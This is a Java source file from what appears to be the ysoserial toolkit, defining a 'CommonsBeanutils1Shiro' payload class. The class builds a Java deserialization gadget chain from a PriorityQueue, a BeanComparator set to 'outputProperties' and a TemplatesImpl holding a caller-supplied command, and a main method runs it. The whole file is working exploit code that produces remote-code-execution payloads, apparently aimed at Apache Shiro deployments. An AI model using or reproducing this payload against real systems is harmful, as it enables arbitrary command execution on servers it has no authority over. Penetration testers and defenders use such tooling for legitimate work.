package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.PriorityQueue;

public class CommonsBeanutils1Shiro implements ObjectPayload<Object> {
    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        final BeanComparator comparator = new BeanComparator(null,  String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1Shiro.class, args);
    }
}
